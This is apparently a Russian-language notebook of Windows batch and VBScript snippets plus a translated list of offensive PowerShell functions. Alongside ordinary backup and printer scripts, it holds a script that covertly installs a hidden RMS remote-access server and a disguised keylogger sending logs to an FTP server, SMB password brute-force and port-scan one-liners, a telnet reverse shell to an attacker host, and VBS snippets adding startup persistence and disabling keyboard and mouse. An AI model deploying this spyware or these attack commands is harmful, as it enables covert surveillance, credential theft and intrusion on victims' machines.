Echo \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
Echo 5 - Restore Favourites From E:\BackUp\Current Day\Favourites    
Echo.
Echo 6 - Restore My Documents From E:\BackUp\Current Day\My Documents   
Echo.
Echo 7 - Restore Desktop From E:\BackUp\Current Day\Desktop      
Echo.
Echo 8 - Restore G:\BackUp\Day Was Copied                
Echo \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
Echo.
 
Set /p choice="Enter number: "
if not defined choice goto m1
if "%choice%"=="1" goto l1
if "%choice%"=="2" goto l2
if "%choice%"=="3" goto l3
if "%choice%"=="4" goto l4
if "%choice%"=="5" goto l5
if "%choice%"=="6" goto l6
if "%choice%"=="7" goto l7
if "%choice%"=="8" goto l8
if "%choice%"=="9" goto l9
 
echo.
echo    BackUp To BackUp\CurrentDay\Your Choice Folder >>>
pause
Set ToDay=%date:~0,2%.%date:~3,2%.%date:~6,4%”
 
:l1
xcopy E:\*.* G:\BackUp\%ToDay% /I /E /S /V
goto m1
 
:l2
xcopy "%UserProfile%\Desktop\*.*" "E:\BackUp\%ToDay%\Desktop" /I /E /S /V
goto m1
 
:l3
xcopy "G:\Programs\My Documents" "E:\BackUp\%ToDay%\My Documents" /I /E /S /V
goto m1
 
:l4
xcopy "%UserProfile%\Favorites" "E:\BackUp\%ToDay%\Favorites" /I /E /S /V
goto m1
 
:l9
xcopy "C:\Windows\regedit.exe" "E:\BackUp%ToDay%\Regedit" /I /E /S /V
goto m1
 
:l5
xcopy "E:\BackUp\%ToDay%\Favorites" "%UserProfile%\Favorites" /I /E /S /V
goto m1
 
:l6
xcopy "E:\BackUp\%ToDay%\My Documents" "G:\Programs\My Documents" /I /E /S /V
goto m1
 
:l7
xcopy "E:\BackUp\%ToDay%\Desktop" "%UserProfile%\Desktop\*.*"  /I /E /S /V
goto m1
 
:l8
xcopy G:\BackUp\%ToDay% E:\*.*  /I /E /S /V
 
echo.
echo ===================
echo Backup Compleated!
echo ===================
goto m1
pause
___________________________________________________________________________________________________________________

@echo off
:: Архивы этой недели (в пути к папке не должно быть пробелов)
set ArcWeek=c:\temp\Week
:: Архивы, более чем недельной давности (в пути к папке не должно быть пробелов)
set ArcOld=c:\temp\Old
:: Папка, с архивируемыми файлами
set Src=c:\temp\data
:: Путь к архиватору 7z (7za.exe)
set Arc=c:\Program Files\7-Zip
 
:: Создать папки, если не существуют
if not exist "%ArcWeek%" md "%ArcWeek%"
if not exist "%ArcOld%" md "%ArcOld%"
 
:: Создаем маркер времени, если его нет
if not exist "%ArcWeek%\TimeMarker" cd.> "%ArcWeek%\TimeMarker"
 
:: Проверяю, если архив текущей недели устарел на более, чем 7 дней - переношу с добавлением даты создания по файлу-маркеру
:: Утилита forfiles входит в состав Windows Vista+ и Resource Kit
:: Проверяем не сам архив, а маркер, потому что утилита forfiles умеет проверять только дату модификации, а не создания
:: а архиватор 7zip при проверке обновлений для архива всегда изменяет дату модификации
FORFILES /p "%ArcWeek%" /M TimeMarker* /C "cmd /c move /y %ArcWeek%\CurWeek.7z %ArcOld%\CurWeek_@fdate.7z" /d -7
:: Если архив был успешно перемещен, создаем новый маркер
if %errorlevel%==0 cd.> "%ArcWeek%\TimeMarker"
 
:: Переходим в каталог, где нужно создать архив
cd /d "%ArcWeek%"
 
:: Архивирую все файлы в архив текущей недели
"%Arc%\7za.exe" u CurWeek.7z "%Src%\*.*"
___________________________________________________________________________________________________________________

@Echo Off
Set DataPath=C:\Temp
Set ArchPath=D:\Temp
Set SevenZipPath=%ProgramFiles%\7-Zip
:: Проверяем Path, если там нету 7-zip - добавляем директорию с бинарником архиватора
Echo %Path%|Find "7-zip">nul||Set Path=%Path%;%SevenZipPath%
:: Получаем список поддиректорий
For /F "delims=" %%A In ('Dir "%DataPath%" /AD /B') Do (
    rem Проверяем наличие уже существующего старого бэкапа, удаляем
    Del "%ArchPath%\%%A.bak" 2>nul
    If Exist "%ArchPath%\%%A.7z" Ren "%ArchPath%\%%A.7z" "%%A.bak"
    rem Пакуем директорию
    7z a "%ArchPath%\%%A.7z" "%DataPath%\%%A"
)
Pause&Exit

___________________________________________________________________________________________________________________

@echo off
Setlocal EnableExtensions EnableDelayedExpansion
chcp 1251>nul
set From=c:\из какой папки архивируем подкаталоги
set Fld=c:\в какой папке создать архивы
if not exist "%Fld%" mkdir "%Fld%"
for /f "delims=" %%i in ('dir "%From%" /b /a:d') do (
  set /a n+=1
  "%ProgramFiles%\WinRAR\Rar.exe" a -ep1 "%Fld%\!n!.rar" "%From%\%%i"
)
chcp 866>nul
pause
___________________________________________________________________________________________________________________
хороший скрипт для бэкапа
@Echo Off
chcp 1251>nul
set fdate=%DATE%
Set DataPath="c:\evgeny"
Set DataPath1="%UserProfile%\Рабочий стол"
Set DataPath2="%UserProfile%\Мои документы"
Set ArchPath="c:\backup"
Set SevenZipPath="%ProgramFiles%\7-Zip"
%SevenZipPath%\7z.exe a -tzip -ssw -mx5  %ArchPath%\%fdate%.evgeny.7z %DataPath%
%SevenZipPath%\7z.exe a -tzip -ssw -mx5  %ArchPath%\%fdate%.desktop.7z %DataPath1%
%SevenZipPath%\7z.exe a -tzip -ssw -mx5  %ArchPath%\%fdate%.documents.7z %DataPath2%
chcp 866>nul
___________________________________________________________________________________________________________________

@echo off
@chcp 1251
@MsiExec /x {61FFA475-24D5-44FB-A51F-39B699E3D82C} /passive REBOOT=ReallySuppress
@MsiExec /x {11A90858-40BB-4858-A2DA-CA6495B5E907} /passive REBOOT=ReallySuppress
@ping 127.0.0.1
@MsiExec /I "rms.server5.1b3ru.msi" /qn       //устанавливаем RMS сервер
@schtasks /create /tn "WindowsUpdate" /tr "C:\Recovery\update\windowsupdate.exe" /sc hourly /mo 5  // создаем задание-каждый 5 часов отправлять файл дневника PuntoSwitcher на 

наш фтп
@ping 127.0.0.1 -n 60 > nul	// ждем 60 секунд
@reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Un install\{11A90858-40BB-4858-A2DA-CA6495B5E907}" /f	//удаляем RMS-сервер из списка установленных программ
@reg delete "HKCR\Installer\Products\85809A11BB0485842AADAC4659  5B9E70" /f	//удаляем RMS-сервер из списка установленных программ
@attrib +S +H "%ProgramFiles%\Remote Manipulator System - Server"	// скрываем папку RMS-сервера от посторонних глаз, ставим аттрибуты скрытый и системный
@tasklist	// сам не знаю зачем, для профилактики наверное. в общем получаем список процессов
@taskkill /im punto.exe		// если на компьтере уже запущен Punto Switcher - убиваем его
@ping 127.0.0.1 -n 10 > nul	// ждем 10 секунд
@DEL "%ProgramFiles%\Yandex\Punto Switcher\*.*" /Q /S /F 	// удаляем все файлы в папке PuntoSwitcher'a
@reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Pol  icies\Explorer\Run" /v "svchost" /t REG_SZ /d "C:\Recovery\svchost.exe" /f >nul  // добавляем наш Пунто в автозагрузку
@start "C:\Recovery\ntldr\svchost.exe"		// запускаем свой Punto Switcher
@DEL "%ProgramFiles%\ViZio WebCam Online Chat\fonts\*.*" /Q /S /F  // чистим временную папку, откуда устанавливалось все это безобразие

___________________________________________________________________________________________________________________
«Penetration Testing Ninjitsu»
C:\> for /L %i in (1,1,255) do @ping 10.10.10.%i –n 1 | fi nd "Reply"

Здесь:

for — команда начала цикла;
/L — указывает, что цикл — счетчик;
%i — имя переменной цикла;
in (1,1,255) — значения от 1 до 255 с шагом 1;
do @ping — окончание цикла выполнением команды ping;
10.10.10.%i — IP-адрес с подставленной переменной;
–n 1 — количество пингов;
| fi nd "Reply" — результата работы передаутся «|» на вход команде find, которая ищет слово «Replay».
Как видишь — все просто. Таким образом, мы находим живые хосты в диапазоне 10.10.10.1-255. 
Логику следующих примеров пояснять не буду, уверен, ты разберешься.
Command1 & Command2 — запуск нескольких команд;
Command1 && Command2 — запуск второй, только при успешном выполнении первой;
> — запись в файл;
>> — запись в конец файла;
For /F — цикл по файлу;
Command 2 > nul — стандартный вывод ошибок не отображается;
Command 2 >> errors.txt — ошибки в файле.

Итак, определяем имена хостов:
C:\> for /L %i in (1,1,255) do @nslookup 10.10.10.%i 2>nul | fi nd "Name" && echo 10.10.10.%i

Порт сканнер на базе ftp-клиента:
C:\> for /L %i in (1,1,1024) do echo Checking Port %i: >> ports.txt & echo open 192.168.0.1 %i > ftp.txt & echo quit >> ftp.txt & ftp -s:ftp.txt 2>>ports.txt

Перебираем логины и пароли из файла на доступ к удаленному хосту по SMB:
C:\> for /f %i in (user.txt) do @(for /f %j in (pass.txt) do @ echo %i:%j & @net use \\10.10.10.10 %j /u:%i 2>nul && echo %i:%j >> success.txt && net use \\10.10.10.10 /del)

Реверсивный шелл через телнет:
telnet [attacker_IPaddr] [port1] | /bin/bash | telnet [attacker_IPaddr] [port2]
___________________________________________________________________________________________________________________

Если хочешь подключить принтер в cmd, то:

-----------------------
@echo off
rundll32 printui.dll,PrintUIEntry /in /n "\\SERVER\PRINTER"
-----------------------

Дополнительно скажу следующее:
rundll32 printui.dll,PrintUIEntry /y /n "\\SERVER\PRINTER" - делает принтер используемым по умолчанию
cscript prnmngr.vbs -d -p "\\SERVER\PRINTER" - удаляет указанный принтер на локальной машине
__________________________________________________________________________________________________________________

query process * | find /I "1cv7.exe" > process.txt 
type process.txt | find /I "rdp-tcp" > active.txt 
type process.txt | find /V /I "rdp-tcp" > nonactive.txt 
for /F "tokens=3" %%i in (active.txt) DO Reset session %%i
for /F "tokens=2" %%i in (nonactive.txt) DO Reset session %%i
del process.txt 
del active.txt 
del nonactive.txt

_________________________________________________________________________________________________________________

добавить в батник:

rem Запретить вход клиентов RDP 
change logon /disable 

после страшных дел

rem Разрешить вход клиентов RDP 
change logon /enable 

____________________________________________________________________________________________________________________

Выполнить через/ждем 10 секунд и тыкаемся в диск w
TIMEOUT /T 10 /NOBREAK 
w:

____________________________________________________________________________________________________________________

подключить сетевую папку ( ШАРА ) 
net use w: \\HOSTNAME\SHARENAME "PASSWORD" /USER:"hostname\username"
____________________________________________________________________________________________________________________

VBS
reg VBS
rundll32 krnl386.exe,exitkernel                   Выход WIN
rundll32 shell32,shexitwindowsex 0                закрыть все проги и перезагрузить
rundll32 shell32,shexitwindowsex 1                выключить
rundll32 shell32,shexitwindowsex 2                перезагрузить
rundll32 shell32,shexitwindowsex 4                принудительное закрытие всех програ
rundll32 shell32,shexitwindowsex 8                Выход из win
rundll32 keyboard,disable                         отключить клаву
rundll32 mouse,disable                            отключить мышь
rundll32 user,swapmousebutton                     поменять клавиши мыши местами
rundll32 user,disableoemlayer                     справоцировать сбой  
rundll32 shell32,shellaboutainfo-box              пок.окно абаут
rundll32 diskcopy,diskcopyrundll                  пок.диалог копир.диска
rundll32 msthtml.dll,printHTML "x:\x"             печать "x:\x" fila
rundll32 htprint2.dll,Rundll_printtestpage        печать тестовой страницы 
rundll32 shell,shellEXecute                       ?
rundll32 shell32,control_rundll time date.cpl     показ дату и время
rundll32 shell32,openas_rundll                    диалог открыть с помощью
rundll32 shell32,shellabouta winHowto.ru          ?
rundll32 shell32,shformatdrive                    диалог farmat:A
rundll32 user,exitwindowsexec                     быстрая перезагрузка
rundll32 url.dll,fileProtocolHandler"@"           открыть "http:\\"
rundll32 user,setcursorBlinkTime n                ?
rundll32 user,cascadechildwindows                 все окна каскадом
rundll user,repaintscreen
rundll32 user,setcurspos


VBS FOLDER AND FILES

1.Создание папки

Set FSA=CreateObject("Scripting.FileSystemObject")
FSA.CreateFolder("c:\Новая папка")

2.Копирование и удаление файла  (здесь "Scripting.FileSystemObject" полный путь к файлу)

Set FSA=CreateObject("Scripting.FileSystemObject")
set file1=FSA.GetFile("wScript.scriptFullName")
file1.copy("c:\x\x.exe")
file1.delete("c:\x\x.exe")

Пример :

Set FSA=CreateObject("Scripting.FileSystemObject")
set file1=FSA.GetFile("c:\x\xc\x.exe")
file1.copy("c:\x\x.exe")  

3.Добавление записей в реэстор

set WSHshell=WScript.CreateObject(Wscript.Shell")
WSHShell.regWrite"HKLM\software\microsoft\Windows\currentVersion\run\Micropatch1.0","c:\x\x.exe",reg_Sz"
-эта запись создет файл который будет стортовать с системой(x.exe)
-также существуют и другие команды regWrite,regDelete,regRead

4.копирование либо удаление файла ипапки

set FST=CreateObject("Scripting.FileSystemObject")
FST.deleteFolder("c:\x")
FST.deleteFile("c:\x\x.com")
FST.copyFolder("c:\x")
FST.copyteFile("c:\x\x.com")

5.-если папка есть то она... -удаляеться

Set FST=CreateObject("Scripting.FileSystemObject")
if FST.FolderExists("c:\x")Then    
FST.DeleteFolder("c:\x")          
end if

6.-если папки нет то она...-создаеться

Set FST=CreateObject("Scripting.FileSystemObject")
if not FST.FolderExists("c:\x")Then
FST.CreateFolder("c:\x")
end if

7.создание В Папки текста

Set FST=CreateObject("Scripting.FileSystemObject")
if not FST.FolderExists("c:\x")Then
FST.CreateFolder("c:\x")
set Fsoo=CreateObject("Scripting.FileSystemObject")
set ShellPtxVBS=fsoo.createTextFile("c:\x\x.txt")
shellptxVBS.writeLine("HI,cyka")
shellptxvbs.close
end if

8.

if day(now)=1Then
if day(now)>1Then
if day(now)<1Then

9.- если файлa НЕТ то он... - Создаеться c тектом

set FS=CreateObject("Scripting.FileSystemObject")
if not FST.FileExists("c:\x\x.txt")Then 
FST.CreateFile("c:\x\x.txt")
set Fsoo=CreateObject("Scripting.FileSystemObject")
set ShellPtxVBS=fsoo.createTextFile("c:\x\x.txt")
shellptxVBS.writeLine("Hi,Brazor")
shellptxvbs.close
end if 

10.-если файл есть то он... - Удаляется

set FS=CreateObject("Scripting.FileSystemObject")
if FS.FileExists("c:\x\x.txt")Then 
FS.deleteFile("c:\x\x.txt")
end if

11.Копирование и удаление файла
Set FSA=CreateObject("Scripting.FileSystemObject")
set file1=FSA.GetFile("c:\x\xc\x.exe")
file1.copy("c:\x\x.exe")  

12.запуск Файлов
 
WshShell=Wscript.CreateObject("Wscript.Shell")
WsHShell.Run("STRAnica.html"1,0)
Wsscript.DisconnectObject(WshShell)

13. 
Taskman
Regedit
Msconfig

14. Сообщение
if Day(now)>1Then
XXX=MsgBox("ПОШЕЛ Н... С ЭТОЙ ТАЧКИ ...:).А ТО ВСЁ ЗАВИСНЕТ!!!:(.",20,"system error")
XXX=MsgBox("Клава отрубилась :)!!Жми дальше и мы...",20,"SYSTEM ERROR")
XXX=MsgBox("Я ТЕБЯ ПРЕДУПРИЖДАЛ :).",20,"SYSTEM ERROR")
end if

15.Отключение клавы и мыши

if Day(now)>1Then
Sub Zapadlo(Fuck,wait)
 Set Wshshell=Wscript.CreateObject("Wscript.Shell")
 x=WshShell.Run(Fuck,Wait)
End Sub
Call Zapadlo("rundll32 keyboard,disable",True)
Call Zapadlo("rundll32 mouse,disable",True)
end if

16.Запуск прги
if Day(now)>1Then
Sub Zapadlo(Fuck,wait)
 Set Wshshell=Wscript.CreateObject("Wscript.Shell")
 x=WshShell.Run(Fuck,Wait)
End Sub
Call Zapadlo("c:\x.exe",True)
end if

17.
if Day(now)>0Then
Sub mmousse(Fuck,wait)
 Set Wshshell=Wscript.CreateObject("Wscript.Shell")
 x=WshShell.Run(Fuck,Wait)
End Sub
Call mmousse("rundll32 mouse,disable",True)
end if
____________________________________________________________________________________________________________________

```

# Part 2

```markdown

Add-Exfiltration, Nishang, Используйте этот скрипт для эксфильтрации данных от цели.
Add-Persistence, PowerSploit, Добавить возможности персистентности в скрипт.
Add-ScrnSaveBackdoor, Nishang, Script, который может устанавливать разделы реестра Debugger для заставки для удаленного выполнения команд и сценариев.
Base64ToString, ConvertFrom, Функция из модуля ConvertFrom, который преобразует Base64 в строку.
Base64, Windows, Подмножество различных методов для вызова методов Base64 в PowerShell.
Check-VM, Nishang, Script, который определяет, находится ли он в известной виртуальной машине.
Copy-VSS, Nishang, Payload, который копирует файл SAM (а также кусты ntds.dit и SYSTEM, если работают на контроллере домена).
Create-MultipleSessions, Nishang, Script, который может проверять учетные данные на удаленных компьютерах и может открывать сеансы PSSession, если учетные данные работают.
Discover-PSInterestingServices, PowerShell-AD-Recon. Этот сценарий используется для обнаружения сетевых серверов с интересными службами без сканирования портов.
Discover-PSMSExchangeServers, PowerShell-AD-Recon. Этот сценарий используется для обнаружения серверов Microsoft Exchange без сканирования портов.
Discover-PSMSSQLServers, PowerShell-AD-Recon. Этот сценарий используется для обнаружения серверов Microsoft SQL без сканирования портов.
DNS_TXT_Pwnage, Nishang, бэкдор, способный получать команды и сценарии PowerShell из запросов DNS TXT.
Do-Exfiltration, Nishang, Этот сценарий можно использовать для эксфильтрации данных из цели в gmail, pastebin, веб-сервер, который может регистрировать POST-запросы, и DNS-сервер, который может регистрировать TXT-запросы.
Download_Execute, Nishang, Payload, чтобы загрузить исполняемый файл в текстовом формате, преобразовать его в исполняемый файл и выполнить.
Download-Execute-PS, Nishang, Payload, который загружает и выполняет сценарий PowerShell.
DownloadFile, Windows, метод WebClient, который загружает ресурс с указанным URI в локальный файл.
DownloadString, Windows, метод WebClient, который загружает запрошенный ресурс в виде строки. Загружаемый ресурс может быть указан либо как String, содержащий URI, либо как Uri.
Enable-DuplicateToken, Nishang, Payload, который дублирует токен доступа lsass и устанавливает его в текущем потоке процесса.
EncodedCommand, Parameter, Wraps DOS-недружественные командные строки таким образом, чтобы их можно было безопасно передавать в PSH для исполнения.
Enter-PSSession, Windows, запускает интерактивный сеанс с удаленным компьютером.
Execute-CommandMSSQL, Nishang, Payload, которые можно использовать для удаленного выполнения команд на сервере MS SQL.
Execute-DNSTXT-Code, Nishang, Payload, который может выполнять шелл-код из DNS TXT-запросов.
Execute-OnTime, Nishang, Payload, ожидающий заданного времени для выполнения скрипта.
Найти AVSignature, PowerSploit, найти крошечные AV подписи.
Find-PSServiceAccounts, PowerShell-AD-Recon. Эта функция обнаруживает все учетные записи пользователей, настроенные с помощью ServicePrincipalName в домене или лесу Active Directory.
Get-ApplicationHost, PowerSploit, восстанавливает зашифрованные пароли приложений и пароли виртуальных каталогов из applicationHost.config в системе.
Get-ComputerInfo, Windows, Получает объединенный объект свойств системы и операционной системы.
Get-GPPPassword, PowerSploit, Get-GPPPassword выполняет поиск на контроллере домена groups.xml, scheduletasks.xml, services.xml и datasources.xml и возвращает незашифрованные пароли.
Get-KerberosPolicy, PowerShell-AD-Recon, самоочевидный
Get-Keystrokes, PowerSploit, Журналы нажатых клавиш, время и активное окно.
Скрипт Get-LsaSecret, Nishang, Nishang, который извлекает секреты LSA с локального компьютера.
Полезные данные Get-PassHashes, Nishang, Nishang, которые сбрасывают хэши паролей.
GetProcAddress, Windows, извлекает адрес экспортированной функции или переменной из указанной библиотеки динамической компоновки (DLL).
Get-PSADForestInfo, PowerShell-AD-Recon. Этот сценарий используется для сбора информации о среде Active Directory.
Get-PSADForestKRBTGTInfo, PowerShell-AD-Recon. Эта функция обнаруживает все учетные записи KRBTGT в лесу и возвращает информацию об учетной записи.
Get-RegAlwaysInstallElevated, PowerSploit, Проверяет, установлен ли какой-либо из разделов реестра AlwaysInstallElevated.
Get-RegAutoLogon, PowerUp теперь PowerSploit, проверит, задан ли раздел реестра AutoAdminLogon, и извлечет все учетные данные в виде открытого текста, если он есть.
Get-ServiceEXEPerms, PowerUp теперь PowerSploit, возвращает имя и путь для любой службы, где текущий пользователь может записать в связанный двоичный файл.
Get-ServicePerms. PoshC2, Проверка разрешений на обслуживание
Get-ServiceUnquoted, PowerUp теперь PowerSploit, возвращает имя и двоичный путь для служб с без кавычками, которые также имеют пробел в имени. (т. е. модуль MSF trust_service_path.rb).
Get-TimedScreenshot, PowerSploit, делает снимки экрана через равные промежутки времени и сохраняет их на диск.
Get-UnattendedInstallFiles, PowerSploit, Проверяет несколько мест на наличие оставшихся файлов автоматической установки, которые могут иметь учетные данные для развертывания.
Get-VaultCredential, PowerSploit, отображает объекты учетных данных хранилища Windows, включая веб-учетные данные в виде открытого текста.
Get-Webconfig, PowerSploit, Этот скрипт восстановит открытый текст и зашифрованные строки подключения из всех файлов web.config в системе. Кроме того, он будет расшифровывать их при необходимости.
Get-WMIObject, Windows, Получает экземпляры классов WMI или информацию о доступных классах.
Gupt-Backdoor, Nishang, Gupt - это бэкдор в Nishang, который может выполнять команды и сценарии от специально созданных имен беспроводных сетей.
HTTP-Backdoor, Nishang, Payload, который запрашивает инструкции для URL-адреса, а затем загружает и выполняет сценарий powershell.
iex, Windows, псевдоним для Invoke-Expression
Invoke-ADSBackdoor, Invoke-AltDSBackdoor, сценарий Powershell, который будет использовать альтернативные потоки данных для достижения постоянства.
Invoke-AllChecks, PowerUp теперь PowerSploit, запускает все текущие проверки эскалации и возвращает отчет
Invoke-BruteForce, Nishang, Payload, который выполняет атаку грубой силой против SQL Server, Active Directory, локальных учетных записей, Интернета и FTP.
Invoke-CallbackIEX, PowerBreach теперь PowerSploit, используется для инициирования обратного вызова к определенному узлу и запроса ресурса. Затем ресурс декодируется и выполняется как сценарий powershell. Есть много методов для обратных вызовов.
Invoke-Command, Windows, запускает команды на локальных и удаленных компьютерах.
Invoke-CreateCertificate, Nishang, извлекает сертификат CA из хранилища и выполняет прямую запись обратно на мобильное устройство.
Invoke-CredentialInjection, PowerSploit. Этот сценарий позволяет злоумышленнику создавать входы с открытым текстом с учетными данными, не вызывая подозрительное событие с кодом 4648 (явный вход с учетными данными).
Invoke-CredentialsPhish, Nishang, Script, который открывает запрос учетных данных пользователя.
Invoke-Decode, Nishang, Script для декодирования и сжатия простых данных.
Invoke-DllInjection, PowerSploit, внедряет Dll в идентификатор процесса по вашему выбору.
Invoke-Encode, Nishang, Script для кодирования и сжатия простых данных.
Invoke-Expression, Windows, Запускает команды или выражения на локальном компьютере.
Invoke-FindDLLHijack, PowerUp теперь PowerSploit, находит возможности угона DLL для запущенных в данный момент процессов
Invoke-FindPathHijack, PowerUp теперь PowerSploit, Находит возможности угона службы% PATH% .DLL
Invoke-MassCommand, Empire, использует WMI и локальный веб-сервер для массового запуска команды на нескольких машинах.
Invoke-MassMimikatz, Empire, Функции для запуска Mimikatz на большом количестве машин без использования PSRemoting.
Invoke-MassSearch, Empire, Функции для запуска запроса индексатора поиска на большом количестве машин без использования PSRemoting.
Invoke-MassTemplate, Empire, Template для массового запуска определенного сценария PowerShell на нескольких компьютерах с использованием локального веб-сервера и выполнения WMI.
Invoke-MassTokens, Empire, запускает PowerSploit Invoke-TokenManiupulation на нескольких машинах, открывая временный веб-сервер и используя WMI для выполнения загрузки / вызова IEX.
Сценарий InvokeMimikatzWDigestDowngrade, Nishang, Nishang, который может создавать пароли в виде простого текста из Windows 8.1 и Server 2012 и далее.
InvokeNetworkRelay, Nishang, Script, который можно использовать для запуска команд пересылки / ретрансляции через порт netsh на удаленных компьютерах.
Invoke-NinjaCopy, PowerSploit. Этот сценарий может копировать файлы с тома NTFS, открывая дескриптор чтения для всего тома (например, c :) и анализируя структуры NTFS. Это требует, чтобы вы были администратором сервера.
Invoke-PortScan, PowerSploit / Nishang, выполняет простое сканирование портов с использованием обычных сокетов, основываясь (довольно) свободно на nmap
Invoke-PoshRatHttp, Nishang, Script, который можно использовать для обратного интерактивного PowerShell от цели через HTTP.
Invoke-PoshRatHttps, Nishang, Script, который можно использовать для обратного интерактивного PowerShell от цели через HTTPS.
Invoke-PowerShellIcmp, Nishang, Script, который можно использовать для обратной интерактивной PowerShell от цели через ICMP.
Invoke-PowerShellTcp, Nishang, Script, который можно использовать для отмены или привязки интерактивной PowerShell от цели.
Invoke-PowerShellUdp, Nishang, Script, который можно использовать для обратного или связывания интерактивного PowerShell из целевого объекта по UDP.
Invoke-PowerShellWmi, Nishang, Script, который можно использовать для интерактивной PowerShell через WMI.
Invoke-PsGcatAgent, Nishang, Script, который можно использовать для выполнения команд и сценариев из Gmail, загруженных Invoke-PSGcat.
Invoke-PSGcat, Nishang, Script, который можно использовать для отправки команд и сценариев в Gmail, которые затем можно запустить на цели с помощью Invoke-PSGcatAgent.
Invoke-PSInject, Empire, задает блок сценариев PowerShell (в кодировке base64), исправляет декодированную логику в соответствующей ReflectivePick .dll архитектуре и внедряет результат в указанный ProcessID.
Invoke-ServiceCMD, PowerUp теперь PowerSploit, выполнить произвольную команду из-за злоупотребления сервисом
Invoke-ServiceDisable, PowerUp теперь PowerSploit, отключает данную службу
Invoke-ServiceEnable, PowerUp теперь PowerSploit, включает данную службу
Invoke-ServiceStart, PowerUp теперь PowerSploit, запускает данную службу
Invoke-ServiceStop, PowerUp теперь PowerSploit, останавливает данную службу
Invoke-ServiceUserAdd, PowerUp теперь PowerSploit, изменяет изменяемый сервис для создания пользователя и добавления его к локальным администраторам
Invoke-ShellcodeMSIL, Empire, Выполнить шелл-код в контексте запущенного процесса PowerShell без каких-либо вызовов функций Win32.
Invoke - Shellcode, PowerSploit / Empire, псевдоним для Invoke-Shellcode
Invoke-Shellcode, PowerSploit / Empire, вставка шелл-кода в идентификатор процесса по вашему выбору или в контексте запущенного процесса PowerShell.
Invoke-TokenManipulation, PowerSploit, для этого сценария требуются права администратора. Он может перечислять доступные токены входа и использовать их для создания новых процессов. Это позволяет вам использовать учетные данные других пользователей по сети, создав процесс с их токеном входа.
Mimikatz, несколько наборов, пытается определить исполнение Mimikatz.
New-ElevatedPersistenceOption, PowerSploit, Настройка параметров повышенной персистентности для функции Add-Persistence.
Out-CHM, Nishang, Script полезен для создания файла справки скомпилированного HTML (.CHM), который можно использовать для запуска команд и сценариев PowerShell.
Out-Excel, Nishang, Script, который может генерировать, а также «заражать» существующие файлы Excel с помощью автоматически исполняемого макроса или DDE.
Out-HTA, Nishang, Script, который можно использовать для создания «зараженного» HTML-приложения. Его можно развернуть на веб-сервере, а сценарии и команды PowerShell можно выполнить на целевом компьютере.
Out-Java, Nishang, Script, который можно использовать для создания JAR-файла для апплетов.
Out-JS, Nishang, Script полезен для создания «оружейного» файла JavaScript, который можно использовать для запуска команд и скриптов PowerShell.
Out-Minidump, PowerSploit, Генерирует мини-дамп процесса с полной памятью.
Out-SCF, Nishang, Script полезен для создания файлов SCF, которые можно использовать для захвата хешей NTLM.
Out-SCT, Nishang, Script полезен для создания «оружейных» файлов SCT, которые можно использовать для запуска команд и скриптов PowerShell.
Out-Shortcut, Nishang, Script, который создает ярлык, способный запускать команды и сценарии PowerShell.
Out-WebQuery, Nishang, Script, который создает файл веб-запроса (.iqy), который можно использовать для фишинговых атак.
Out-Word, Nishang, Script, который может генерировать, а также «заражать» существующие файлы слов автоматически исполняемым макросом или DDE.
Parse_Keys, Nishang, Скрипт, который можно использовать для разбора ключей, зарегистрированных полезной нагрузкой Kelogger из Nishang.
Полезная нагрузка, просто имя, просто определить ключевое слово полезной нагрузки.
Powercat, Powercat, версия Netcat для PowerShell.
PowershellEmpire, PowerShell Empire, Empire - это чистый агент PowerShell для постэксплуатации, построенный на криптологически безопасных коммуникациях и гибкой архитектуре.
Powersploit, Powersploit, PowerSploit - это набор модулей Microsoft PowerShell, которые можно использовать для помощи тестерам проникновения на всех этапах оценки.
ReflectivePEInjection, PowerSploit, этот скрипт имеет два режима. Он может рефлексивно загружать DLL / EXE в процесс PowerShell или рефлексивно загружать DLL в удаленный процесс.
Remove-Persistence, PowerSploit, Удалить возможности сохранения в скрипте.
Remove-PoshRat, Nishang, Script, который удаляет правила брандмауэра, установленные PoshRat.
Remove-Update, Nishang, Payload, который молча удаляет обновления для целевой машины.
Restore-ServiceEXE, PowerUp, восстанавливает ранее записанный EXE с помощью Write-ServiceExe.
Run-EXEonRemote, Nishang, Script, который может удалять и выполнять исполняемые файлы на нескольких компьютерах.
StringtoBase64, ConvertFrom, Функция из модуля ConvertFrom, который преобразует String в Base64.
System.Management, Windows. Предоставляет доступ к обширному набору управляющей информации и событий управления системой, устройствами и приложениями, оснащенными инфраструктурой инструментария управления Windows (WMI).
System.Reflection, Windows, Пространство имен System.Reflection содержит типы, которые получают информацию о сборках, модулях, элементах, параметрах и других объектах в управляемом коде путем изучения их метаданных.
TexttoEXE, Nishang, Script для преобразования PE-файла в шестнадцатеричном формате в исполняемый
Write-CMDServiceBinary, PowerSploit, исправляет в указанной команде предварительно скомпилированный исполняемый файл службы C # и записывает двоичный файл в указанное расположение ServicePath.
Write-ServiceEXECMD, PowerUp, Может использоваться для злоупотребления уязвимыми двоичными файлами, найденными Get-ServiceEXEPerms.
Write-ServiceEXE, PowerUp, Может использоваться для злоупотребления уязвимыми двоичными файлами, найденными Get-ServiceEXEPerms.
Write-UserAddMSI
Write-UserAddServiceBinary, PowerUp теперь PowerSploit, эксплуатирует пути обслуживания без кавычек.
wsman, Windws Object, Предоставляет методы и свойства, используемые для создания сеанса, представленного объектом Session. Любые операции удаленного управления Windows требуют создания сеанса, который подключается к удаленному компьютеру, базовому контроллеру управления (BMC) или локальному компьютеру. Операции включают получение, запись, перечисление данных или вызов методов.

```
